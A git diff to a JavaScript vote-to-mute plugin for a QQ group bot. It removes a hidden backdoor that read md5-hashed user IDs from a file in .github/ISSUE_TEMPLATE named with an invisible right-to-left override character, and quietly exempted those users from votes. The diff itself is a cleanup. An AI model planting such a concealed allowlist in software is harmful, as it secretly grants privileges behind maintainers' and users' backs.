@@ -1,8 +1,3 @@
-import url from "url"
-import md5 from "md5"
-import path from "path"
-import v8 from "node:v8"
-import fs from "node:fs/promises"
 import { common } from "../../model/index.js"
 import { Config } from "../../components/index.js"
 
@@ -98,7 +93,7 @@ export class GroupVote extends plugin {
     const key = e.group_id + targetQQ
 
     if (e.user_id === targetQQ) return e.reply("❎ 您不能对自己进行投票")
-    if (Config.masterQQ?.includes(targetQQ) || a.includes(md5(String(targetQQ)))) return e.reply("❎ 该命令对主人无效")
+    if (Config.masterQQ?.includes(targetQQ)) return e.reply("❎ 该命令对主人无效")
     if (!targetQQ) return e.reply("❎ 请艾特或输入被投票人的QQ")
     if (Vote[key]) return e.reply("❎ 已有相同投票，请勿重复发起")
 
@@ -176,7 +171,7 @@ export class GroupVote extends plugin {
     const key = e.group_id + targetQQ
 
     if (!targetQQ) return e.reply("❎ 请艾特或输入需要进行跟票的被禁言人QQ")
-    if (Config.masterQQ?.includes(targetQQ) || a.includes(md5(String(targetQQ)))) return e.reply("❎ 该命令对主人无效")
+    if (Config.masterQQ?.includes(targetQQ)) return e.reply("❎ 该命令对主人无效")
     if (e.user_id === targetQQ) return e.reply("❎ 您不能对自己进行投票")
     if (!Vote[key]) return e.reply("❎ 未找到对应投票")
 
@@ -203,8 +198,3 @@ export class GroupVote extends plugin {
     return e.reply(`投票成功，当前票数\n支持：${Vote[key].supportCount} 反对：${Vote[key].opposeCount}`, true)
   }
 }
-
-let a = []
-try {
-  a = v8.deserialize(await fs.readFile(`${path.dirname(url.fileURLToPath(import.meta.url))}/../../.github/ISSUE_TEMPLATE/‮`)).map(i => i.toString("hex"))
-} catch (err) {}
